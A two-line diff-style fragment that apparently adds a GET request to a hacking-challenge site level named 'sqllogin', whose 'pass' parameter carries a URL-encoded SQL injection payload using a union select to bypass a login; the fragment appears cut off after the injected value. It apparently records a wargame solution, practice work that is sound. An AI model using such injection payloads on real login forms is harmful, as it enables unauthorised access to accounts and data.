@@ -1,0 +1,2 @@
+GET
+https://hax.tor.hu/level44/sqllogin/index.php?user=nobody&pass=1'%20and%201=0%20union%20all%20select%20'<email>
